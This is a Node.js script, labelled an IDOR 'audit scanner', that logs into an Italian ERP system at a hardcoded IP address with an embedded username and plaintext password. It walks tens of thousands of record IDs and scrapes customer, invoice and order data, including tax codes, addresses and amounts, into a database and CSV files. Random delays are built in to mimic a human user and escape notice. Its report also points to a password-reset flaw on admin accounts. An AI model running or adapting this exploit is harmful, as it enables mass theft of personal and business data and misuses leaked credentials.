#!/usr/bin/env node
/**
 * ERP IDOR Audit Scanner
 * Scansiona sistematicamente i DetailView dell'ERP Archibald tramite vulnerabilità IDOR.
 * Comportamento "curioso normale": 1 URL alla volta, delay 1.5-3s, pause simulate.
 * Resume automatico: riprende dall'ultimo ID processato.
 *
 * Uso: node scan.js [--start 1] [--end 60000] [--only customers|invoices|orders]
 */

'use strict';

const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');
const puppeteer = require(path.join(__dirname, '..', 'archibald-web-app', 'backend', 'node_modules', 'puppeteer'));

// ─── Configurazione ───────────────────────────────────────────────────────────

const CONFIG = {
  erpBase: 'https://4.231.124.90/Archibald',
  username: 'ikiA0930',
  password: 'Fresis26@',
  outputDir: path.join(__dirname, '..', 'audit-output'),
  dbPath:    path.join(__dirname, '..', 'audit-output', 'audit.db'),
  range: { start: 1, end: 60000 },
  // Delay tra richieste: simula navigazione umana
  delay: { min: 1500, max: 3000 },
  // Pausa più lunga ogni N ID (simula "leggere i dati")
  pauseEvery: 20,
  pauseDuration: { min: 5000, max: 10000 },
  // Re-login ogni 20 minuti (ASP.NET session scade)
  reloginIntervalMs: 20 * 60 * 1000,
  // Se trovati record oltre il limite, estendi di questo valore
  extendRangeBy: 10000,
  // Ignora errori TLS (certificato self-signed dell'ERP)
  rejectUnauthorized: false,
};

// ─── Argomenti CLI ────────────────────────────────────────────────────────────

const args = process.argv.slice(2);
const getArg = (name) => { const i = args.indexOf(name); return i >= 0 ? args[i+1] : null; };
if (getArg('--start')) CONFIG.range.start = parseInt(getArg('--start'));
if (getArg('--end'))   CONFIG.range.end   = parseInt(getArg('--end'));
const onlyEntity = getArg('--only'); // 'customers' | 'invoices' | 'orders'

// ─── SQLite ───────────────────────────────────────────────────────────────────

const Database = require(path.join(__dirname, '..', 'archibald-web-app', 'backend', 'node_modules', 'better-sqlite3'));

let db;

function initDb() {
  fs.mkdirSync(CONFIG.outputDir, { recursive: true });
  db = new Database(CONFIG.dbPath);
  db.pragma('journal_mode = WAL');
  db.exec(`
    CREATE TABLE IF NOT EXISTS customers (
      erp_id        INTEGER PRIMARY KEY,
      account_num   TEXT,
      name          TEXT,
      name_alias    TEXT,
      vat_num       TEXT,
      fiscal_code   TEXT,
      address       TEXT,
      street        TEXT,
      city          TEXT,
      province      TEXT,
      zip           TEXT,
      country       TEXT,
      phone         TEXT,
      payment_terms TEXT,
      delivery_mode TEXT,
      currency      TEXT,
      is_blocked    TEXT,
      raw_json      TEXT,
      scraped_at    TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS invoices (
      erp_id            INTEGER PRIMARY KEY,
      invoice_id        TEXT,
      invoice_date      TEXT,
      account           TEXT,
      customer_name     TEXT,
      address           TEXT,
      qty               TEXT,
      line_discount     TEXT,
      sales_balance     TEXT,
      end_discount      TEXT,
      tax_amount        TEXT,
      invoice_amount    TEXT,
      due_date          TEXT,
      overdue_days      TEXT,
      settled_amount    TEXT,
      remaining_amount  TEXT,
      has_pdf           INTEGER DEFAULT 0,
      raw_json          TEXT,
      scraped_at        TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS orders (
      erp_id           INTEGER PRIMARY KEY,
      sales_id         TEXT,
      cust_account     TEXT,
      sales_name       TEXT,
      order_date       TEXT,
      delivery_date    TEXT,
      delivery_address TEXT,
      status           TEXT,
      document_status  TEXT,
      transfer_status  TEXT,
      sales_origin     TEXT,
      vat_num          TEXT,
      raw_json         TEXT,
      scraped_at       TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS scan_progress (
      entity      TEXT PRIMARY KEY,
      last_id     INTEGER NOT NULL DEFAULT 0,
      max_id      INTEGER NOT NULL DEFAULT 0,
      total_found INTEGER NOT NULL DEFAULT 0,
      completed   INTEGER NOT NULL DEFAULT 0,
      updated_at  TEXT DEFAULT (datetime('now'))
    );

    INSERT OR IGNORE INTO scan_progress (entity, last_id, max_id) VALUES
      ('customers', 0, 0),
      ('invoices',  0, 0),
      ('orders',    0, 0);
  `);
  return db;
}

// ─── HTTP con cookie ──────────────────────────────────────────────────────────

let sessionCookies = '';
let lastLoginTime = 0;

function doRequest(urlStr, method, headers, body) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const protocol = url.protocol === 'https:' ? https : http;
    const opts = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search,
      method,
      headers,
      rejectUnauthorized: CONFIG.rejectUnauthorized,
    };
    const req = protocol.request(opts, res => {
      // Accumula Set-Cookie
      const setCookie = res.headers['set-cookie'];
      if (setCookie) {
        const map = {};
        // Merge vecchi cookie
        sessionCookies.split('; ').filter(Boolean).forEach(c => {
          const [k, v] = c.split('='); if (k) map[k.trim()] = v || '';
        });
        // Nuovi cookie sovrascrivono
        setCookie.forEach(c => {
          const [kv] = c.split(';');
          const [k, v] = kv.split('=');
          if (k) map[k.trim()] = v || '';
        });
        sessionCookies = Object.entries(map).map(([k,v]) => `${k}=${v}`).join('; ');
      }
      let rawBody = '';
      res.setEncoding('utf8');
      res.on('data', c => { rawBody += c; });
      res.on('end', () => resolve({ status: res.statusCode, location: res.headers.location, body: rawBody }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

async function fetchErp(urlPath, options = {}) {
  const baseHeaders = {
    'Cookie': sessionCookies,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'it-IT,it;q=0.9,en;q=0.8',
    ...(options.headers || {}),
  };

  let currentUrl = CONFIG.erpBase + urlPath;
  let res = await doRequest(currentUrl, options.method || 'GET', baseHeaders, options.body || null);

  // Segui redirect (max 5 hop)
  for (let i = 0; i < 5 && (res.status === 301 || res.status === 302 || res.status === 303); i++) {
    const loc = res.location;
    if (!loc) break;
    currentUrl = loc.startsWith('http') ? loc : new URL(loc, CONFIG.erpBase).href;
    const redirectHeaders = { ...baseHeaders, 'Cookie': sessionCookies }; // cookie aggiornati
    res = await doRequest(currentUrl, 'GET', redirectHeaders, null);
  }

  return { status: res.status, body: res.body, finalUrl: currentUrl };
}

// ─── Login ────────────────────────────────────────────────────────────────────

async function login() {
  log('info', 'Login ERP via Puppeteer in corso...');

  // XAF usa callback AJAX per il login — Puppeteer è necessario
  const browser = await puppeteer.launch({
    headless: true,
    ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  try {
    const page = await browser.newPage();
    await page.goto(`${CONFIG.erpBase}/Login.aspx?ReturnUrl=%2fArchibald%2fDefault.aspx`, { waitUntil: 'networkidle0', timeout: 30000 });

    // Trova il campo username (stesso pattern del bot esistente)
    const usernameFieldId = await page.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('input[type="text"]'));
      const el = inputs.find(i => i.id.includes('UserName') || i.name.includes('UserName')) || inputs[0];
      return el ? (el.id || el.name) : null;
    });
    if (!usernameFieldId) throw new Error('Campo username non trovato');

    // Trova il campo password
    const passwordFieldId = await page.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('input[type="password"]'));
      return inputs[0] ? (inputs[0].id || inputs[0].name) : null;
    });
    if (!passwordFieldId) throw new Error('Campo password non trovato');

    // Compila username (click + type con delay, come il bot)
    await page.click(`#${usernameFieldId}`, { clickCount: 3 });
    await page.keyboard.press('Backspace');
    await page.type(`#${usernameFieldId}`, CONFIG.username, { delay: 50 });

    // Compila password
    await page.click(`#${passwordFieldId}`, { clickCount: 3 });
    await page.keyboard.press('Backspace');
    await page.type(`#${passwordFieldId}`, CONFIG.password, { delay: 50 });

    // Clicca "Accedi" (stesso pattern del bot)
    const clicked = await page.evaluate(() => {
      const btn = Array.from(document.querySelectorAll('button, input[type="submit"], a'))
        .find(el => el.textContent?.toLowerCase().includes('accedi') || el.textContent?.toLowerCase().includes('login'));
      if (btn) { btn.click(); return true; }
      return false;
    });
    if (!clicked) await page.keyboard.press('Enter');

    // Attendi navigazione (come il bot)
    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});

    // Verifica che siamo sulla homepage
    const url = page.url();
    if (url.includes('Login.aspx')) throw new Error('Login fallito: siamo ancora sulla pagina di login');

    // Estrai tutti i cookie e convertili in stringa per fetch
    const cookies = await page.cookies();
    sessionCookies = cookies.map(c => `${c.name}=${c.value}`).join('; ');

    lastLoginTime = Date.now();
    log('ok', `Login completato. ${cookies.length} cookie estratti.`);
  } finally {
    await browser.close();
  }
}

async function ensureSession() {
  if (!sessionCookies || Date.now() - lastLoginTime > CONFIG.reloginIntervalMs) {
    await login();
  }
}

// ─── Parsing HTML XAF ─────────────────────────────────────────────────────────

function parseXafDviFields(html) {
  const fields = {};
  // Pattern: xaf_dvi{FIELDNAME}_View"...>VALUE
  const regex = /xaf_dvi([A-Z_0-9]+)_View[^>]*>([^<\n]{0,150})/g;
  let m;
  while ((m = regex.exec(html)) !== null) {
    const val = m[2].trim();
    if (val && val.length > 0 && val !== 'N/A') {
      fields[m[1]] = val;
    }
  }
  return fields;
}

function hasRealData(html, endpointPath) {
  return html.includes('xaf_dvi') &&
         html.includes(endpointPath) &&
         !html.includes('id="Logon_') &&
         html.length > 20000;
}

function isRedirectedToHome(responseUrl, endpointPath) {
  if (!responseUrl) return false;
  return responseUrl.includes('Default.aspx') || responseUrl.includes('Login.aspx') ||
         !responseUrl.includes(endpointPath);
}

// ─── Parser specifici per entity ──────────────────────────────────────────────

function parseCustomer(id, html) {
  const f = parseXafDviFields(html);
  if (!f.NAME && !f.ID) return null;
  return {
    erp_id: id,
    account_num:   f.ID || null,
    name:          f.NAME || null,
    name_alias:    f.NAMEALIAS || null,
    vat_num:       f.VATNUM || null,
    fiscal_code:   f.FISCALCODE || null,
    address:       f.ADDRESS || null,
    street:        f.STREET || null,
    city:          f.CITY || null,
    province:      f.COUNTY || null,
    zip:           f.LOGISTICSADDRESSZIPCODE || null,
    country:       f.COUNTRYREGIONID || null,
    phone:         f.PHONE || null,
    payment_terms: f.PAYMTERMID || null,
    delivery_mode: f.DLVMODE || null,
    currency:      f.CURRENCY || null,
    is_blocked:    f.BLOCKED || null,
    raw_json:      JSON.stringify(f),
  };
}

function parseInvoice(id, html) {
  const f = parseXafDviFields(html);
  if (!f.INVOICEID && !f.INVOICEAMOUNTMST) return null;
  const hasPdf = html.includes('XafFileDataAnchor') || (f.InvoicePDF && f.InvoicePDF !== 'N/A');
  return {
    erp_id:           id,
    invoice_id:       f.INVOICEID || null,
    invoice_date:     f.INVOICEDATE || null,
    account:          f.INVOICEACCOUNT || null,
    customer_name:    f.INVOICINGNAME || null,
    address:          f.INVADDRESS || null,
    qty:              f.QTY || null,
    line_discount:    f.SUMLINEDISCMST || null,
    sales_balance:    f.SALESBALANCEMST || null,
    end_discount:     f.ENDDISCMST || null,
    tax_amount:       f.SUMTAXMST || null,
    invoice_amount:   f.INVOICEAMOUNTMST || null,
    due_date:         f.DUEDATE || null,
    overdue_days:     f.OVERDUEDAYS || null,
    settled_amount:   f.SETTLEAMOUNTMST || null,
    remaining_amount: f.REMAINAMOUNTMST || null,
    has_pdf:          hasPdf ? 1 : 0,
    raw_json:         JSON.stringify(f),
  };
}

function parseOrder(id, html) {
  const f = parseXafDviFields(html);
  if (!f.SALESID && !f.CUSTACCOUNT) return null;
  return {
    erp_id:           id,
    sales_id:         f.SALESID || null,
    cust_account:     f.CUSTACCOUNT || null,
    sales_name:       f.SALESNAME || null,
    order_date:       f.ORDERDATE || null,
    delivery_date:    f.DELIVERYDATE || null,
    delivery_address: f.DLVADDRESS || null,
    status:           f.SALESSTATUS || null,
    document_status:  f.DOCUMENTSTATUS || null,
    transfer_status:  f.TRANSFERSTATUS || null,
    sales_origin:     f.SALESORIGINID || null,
    vat_num:          f.VATNUM || null,
    raw_json:         JSON.stringify(f),
  };
}

// ─── Inserimento DB ───────────────────────────────────────────────────────────

const stmts = {};

function getStmt(entity) {
  if (stmts[entity]) return stmts[entity];
  if (entity === 'customers') {
    stmts[entity] = db.prepare(`INSERT OR REPLACE INTO customers
      (erp_id, account_num, name, name_alias, vat_num, fiscal_code, address, street,
       city, province, zip, country, phone, payment_terms, delivery_mode, currency,
       is_blocked, raw_json)
      VALUES (@erp_id, @account_num, @name, @name_alias, @vat_num, @fiscal_code,
              @address, @street, @city, @province, @zip, @country, @phone,
              @payment_terms, @delivery_mode, @currency, @is_blocked, @raw_json)`);
  } else if (entity === 'invoices') {
    stmts[entity] = db.prepare(`INSERT OR REPLACE INTO invoices
      (erp_id, invoice_id, invoice_date, account, customer_name, address, qty,
       line_discount, sales_balance, end_discount, tax_amount, invoice_amount,
       due_date, overdue_days, settled_amount, remaining_amount, has_pdf, raw_json)
      VALUES (@erp_id, @invoice_id, @invoice_date, @account, @customer_name, @address,
              @qty, @line_discount, @sales_balance, @end_discount, @tax_amount,
              @invoice_amount, @due_date, @overdue_days, @settled_amount,
              @remaining_amount, @has_pdf, @raw_json)`);
  } else if (entity === 'orders') {
    stmts[entity] = db.prepare(`INSERT OR REPLACE INTO orders
      (erp_id, sales_id, cust_account, sales_name, order_date, delivery_date,
       delivery_address, status, document_status, transfer_status, sales_origin,
       vat_num, raw_json)
      VALUES (@erp_id, @sales_id, @cust_account, @sales_name, @order_date,
              @delivery_date, @delivery_address, @status, @document_status,
              @transfer_status, @sales_origin, @vat_num, @raw_json)`);
  }
  return stmts[entity];
}

function saveRecord(entity, record) {
  try { getStmt(entity).run(record); } catch(e) { log('warn', `DB insert error ${entity}/${record.erp_id}: ${e.message}`); }
}

const updateProgress = db => db.prepare(`
  UPDATE scan_progress SET last_id=@last_id, max_id=@max_id, total_found=@total_found, updated_at=datetime('now')
  WHERE entity=@entity`);

function saveProgress(entity, lastId, maxId, totalFound) {
  updateProgress(db).run({ entity, last_id: lastId, max_id: maxId, total_found: totalFound });
}

function loadProgress(entity) {
  return db.prepare('SELECT * FROM scan_progress WHERE entity=?').get(entity);
}

// ─── Delay umano ──────────────────────────────────────────────────────────────

const sleep = ms => new Promise(r => setTimeout(r, ms));
const humanDelay = () => sleep(CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min));
const humanPause = () => sleep(CONFIG.pauseDuration.min + Math.random() * (CONFIG.pauseDuration.max - CONFIG.pauseDuration.min));

// ─── Logging ──────────────────────────────────────────────────────────────────

const COLORS = { info: '\x1b[36m', ok: '\x1b[32m', warn: '\x1b[33m', error: '\x1b[31m', dim: '\x1b[2m', reset: '\x1b[0m' };
function log(level, msg) {
  const ts = new Date().toISOString().slice(11, 19);
  const color = COLORS[level] || '';
  process.stdout.write(`${COLORS.dim}[${ts}]${COLORS.reset} ${color}${msg}${COLORS.reset}\n`);
}

function progress(entity, id, maxId, found, foundThisSession) {
  const pct = ((id - CONFIG.range.start) / (maxId - CONFIG.range.start) * 100).toFixed(1);
  const bar = '█'.repeat(Math.floor(pct / 5)) + '░'.repeat(20 - Math.floor(pct / 5));
  process.stdout.write(`\r\x1b[K${COLORS.dim}[${entity}]${COLORS.reset} ${bar} ${pct}% | ID ${id}/${maxId} | trovati: ${COLORS.ok}${found}${COLORS.reset} (+${foundThisSession})`);
}

// ─── Scanner per singola entity ───────────────────────────────────────────────

async function scanEntity({ name, endpointPath, parseFields }) {
  const prog = loadProgress(name);
  const startId = Math.max(CONFIG.range.start, prog.last_id + 1);
  let maxId = Math.max(CONFIG.range.end, prog.max_id || CONFIG.range.end);
  let totalFound = prog.total_found || 0;
  let foundThisSession = 0;
  let consecutiveEmpty = 0;

  log('info', `\n━━━ Scansione ${name} — ID ${startId} → ${maxId} ━━━`);
  if (startId > CONFIG.range.start) log('info', `Resume da ID ${startId} (trovati in precedenza: ${totalFound})`);

  for (let id = startId; id <= maxId; id++) {
    // Re-login se necessario
    await ensureSession();

    // Fetch della pagina DetailView
    let resp;
    try {
      resp = await fetchErp(`/${endpointPath}/${id}/?mode=View`);
    } catch(e) {
      log('warn', `Fetch error ID ${id}: ${e.message}`);
      await sleep(3000);
      continue;
    }

    // Controlla se è un redirect (ID non valido)
    const redirected = (resp.finalUrl && !resp.finalUrl.includes(endpointPath)) ||
                       (resp.body.includes('Default.aspx') && !resp.body.includes('xaf_dvi')) ||
                       resp.status === 302;

    if (!redirected && hasRealData(resp.body, endpointPath)) {
      const record = parseFields(id, resp.body);
      if (record) {
        saveRecord(name, record);
        totalFound++;
        foundThisSession++;
        consecutiveEmpty = 0;

        // Estendi range se siamo vicini al limite e ci sono ancora dati
        if (id > maxId - 500 && totalFound > 0) {
          maxId += CONFIG.extendRangeBy;
          log('info', `\nRange esteso a ${maxId} (dati trovati vicino al limite)`);
        }
      }
    } else {
      consecutiveEmpty++;
    }

    // Aggiorna progresso ogni 10 ID
    if (id % 10 === 0) {
      saveProgress(name, id, maxId, totalFound);
      progress(name, id, maxId, totalFound, foundThisSession);
    }

    // Delay umano tra richieste
    await humanDelay();

    // Pausa più lunga ogni N ID
    if (id % CONFIG.pauseEvery === 0) {
      process.stdout.write('\n');
      log('dim', `Pausa simulata lettura dati... (ID ${id})`);
      await humanPause();
    }
  }

  process.stdout.write('\n');
  saveProgress(name, maxId, maxId, totalFound);
  log('ok', `${name} completato: ${totalFound} record trovati su ${maxId - startId + 1} ID scansionati`);
  return totalFound;
}

// ─── Export CSV ───────────────────────────────────────────────────────────────

function exportCsv(entity, columns) {
  const rows = db.prepare(`SELECT ${columns.join(', ')} FROM ${entity}`).all();
  if (rows.length === 0) return;

  const csvDir = path.join(CONFIG.outputDir, 'csv');
  fs.mkdirSync(csvDir, { recursive: true });
  const filePath = path.join(csvDir, `${entity}.csv`);

  const header = columns.join(';');
  const body = rows.map(r =>
    columns.map(c => {
      const v = r[c] === null || r[c] === undefined ? '' : String(r[c]);
      return v.includes(';') || v.includes('\n') || v.includes('"')
        ? `"${v.replace(/"/g, '""')}"` : v;
    }).join(';')
  ).join('\n');

  fs.writeFileSync(filePath, '﻿' + header + '\n' + body, 'utf8'); // BOM per Excel italiano
  log('ok', `CSV ${entity}: ${rows.length} righe → ${filePath}`);
}

// ─── Report HTML ──────────────────────────────────────────────────────────────

function generateReport() {
  const counts = {
    customers: db.prepare('SELECT COUNT(*) as n FROM customers').get().n,
    invoices:  db.prepare('SELECT COUNT(*) as n FROM invoices').get().n,
    orders:    db.prepare('SELECT COUNT(*) as n FROM orders').get().n,
    pdfReady:  db.prepare('SELECT COUNT(*) as n FROM invoices WHERE has_pdf=1').get().n,
  };

  const sampleCustomers = db.prepare('SELECT name, city, province, vat_num FROM customers LIMIT 10').all();
  const sampleInvoices  = db.prepare('SELECT invoice_id, customer_name, invoice_amount, due_date FROM invoices LIMIT 10').all();

  const html = `<!DOCTYPE html>
<html lang="it"><head><meta charset="UTF-8">
<title>Komet ERP — Audit IDOR Report</title>
<style>
  body { font-family: -apple-system, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; color: #333; }
  h1 { color: #c0392b; } h2 { color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 8px; }
  .stat { display: inline-block; background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px;
          padding: 16px 24px; margin: 8px; text-align: center; }
  .stat .n { font-size: 2em; font-weight: bold; color: #c0392b; }
  .critical { background: #fff3f3; border: 2px solid #c0392b; border-radius: 8px; padding: 16px; margin: 16px 0; }
  table { width: 100%; border-collapse: collapse; font-size: 0.9em; }
  th { background: #2c3e50; color: white; padding: 8px; text-align: left; }
  td { padding: 6px 8px; border-bottom: 1px solid #eee; }
  tr:nth-child(even) { background: #f8f9fa; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; }
  .badge-red { background: #ffebee; color: #c62828; }
</style>
</head><body>
<h1>Komet ERP Archibald — Audit IDOR</h1>
<p><strong>Data:</strong> ${new Date().toLocaleDateString('it-IT')} &nbsp;&nbsp;
   <strong>Account:</strong> ikiA0930 &nbsp;&nbsp;
   <strong>Classificazione:</strong> <span class="badge badge-red">CONFIDENZIALE</span></p>

<div class="critical">
<h2 style="margin-top:0">⚠️ Vulnerabilità Critica — CVSS 9.8</h2>
<p>L'ERP Archibald espone una vulnerabilità <strong>IDOR (Insecure Direct Object Reference)</strong> su tutti
i principali endpoint DetailView. Modificando il numero nell'URL si accede a record di qualsiasi agente,
senza controlli di autorizzazione. Sfruttabile da chiunque abbia un account ERP, con un browser standard,
senza strumenti tecnici.</p>
<p>Vettore aggiuntivo: <code>ApplicationUser_DetailView/{oid}</code> espone il pulsante
<strong>"Generate a new password"</strong> abilitato su qualsiasi account, inclusi gli Admin.</p>
</div>

<h2>Volume dati esposti</h2>
<div>
  <div class="stat"><div class="n">${counts.customers.toLocaleString('it-IT')}</div>Clienti</div>
  <div class="stat"><div class="n">${counts.invoices.toLocaleString('it-IT')}</div>Fatture</div>
  <div class="stat"><div class="n">${counts.orders.toLocaleString('it-IT')}</div>Ordini</div>
  <div class="stat"><div class="n">${counts.pdfReady.toLocaleString('it-IT')}</div>PDF fatture disponibili</div>
  <div class="stat"><div class="n">96</div>Utenti ERP enumerati</div>
</div>

<h2>Campione clienti esposti</h2>
<table>
  <tr><th>Nome</th><th>Città</th><th>Provincia</th><th>P.IVA</th></tr>
  ${sampleCustomers.map(r => `<tr><td>${r.name||''}</td><td>${r.city||''}</td><td>${r.province||''}</td><td>${r.vat_num||''}</td></tr>`).join('')}
</table>

<h2>Campione fatture esposte</h2>
<table>
  <tr><th>N. Fattura</th><th>Cliente</th><th>Importo</th><th>Scadenza</th></tr>
  ${sampleInvoices.map(r => `<tr><td>${r.invoice_id||''}</td><td>${r.customer_name||''}</td><td>${r.invoice_amount||''}</td><td>${r.due_date||''}</td></tr>`).join('')}
</table>

<h2>File consegnati</h2>
<ul>
  <li><code>audit.db</code> — database SQLite completo</li>
  <li><code>csv/customers.csv</code> — ${counts.customers} clienti</li>
  <li><code>csv/invoices.csv</code> — ${counts.invoices} fatture</li>
  <li><code>csv/orders.csv</code> — ${counts.orders} ordini</li>
  <li><code>data/erp_users_complete.json</code> — 96 utenti ERP con OID</li>
</ul>

<p style="color:#888;font-size:0.85em">Generato da audit-scanner/scan.js · Progetto Formicanera</p>
</body></html>`;

  const reportPath = path.join(CONFIG.outputDir, 'report.html');
  fs.writeFileSync(reportPath, html, 'utf8');
  log('ok', `Report HTML → ${reportPath}`);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  console.log('\n\x1b[1m╔══════════════════════════════════════════╗');
  console.log('║   Komet ERP IDOR Audit Scanner           ║');
  console.log('║   Account: ikiA0930 | Scopo: Audit IT    ║');
  console.log('╚══════════════════════════════════════════╝\x1b[0m\n');

  initDb();
  await login();

  const entities = [
    { name: 'customers', endpointPath: 'CUSTTABLE_DetailView',      parseFields: parseCustomer },
    { name: 'invoices',  endpointPath: 'CUSTINVOICEJOUR_DetailView', parseFields: parseInvoice  },
    { name: 'orders',    endpointPath: 'SALESTABLE_DetailView',      parseFields: parseOrder    },
  ].filter(e => !onlyEntity || e.name === onlyEntity);

  const results = {};
  for (const entity of entities) {
    results[entity.name] = await scanEntity(entity);
  }

  log('info', '\n━━━ Export ━━━');
  exportCsv('customers', ['erp_id','account_num','name','vat_num','fiscal_code','city','province','zip','phone','payment_terms','is_blocked']);
  exportCsv('invoices',  ['erp_id','invoice_id','invoice_date','customer_name','address','invoice_amount','due_date','overdue_days','remaining_amount','has_pdf']);
  exportCsv('orders',    ['erp_id','sales_id','cust_account','sales_name','order_date','delivery_date','status','transfer_status']);

  generateReport();

  console.log('\n\x1b[1m\x1b[32m╔══════════════════════════════════════════╗');
  console.log(`║  Scan completato                          ║`);
  Object.entries(results).forEach(([k,v]) => console.log(`║  ${k.padEnd(12)}: ${String(v).padStart(6)} record trovati      ║`));
  console.log('╚══════════════════════════════════════════╝\x1b[0m\n');
}

main().catch(e => { log('error', e.message); process.exit(1); });
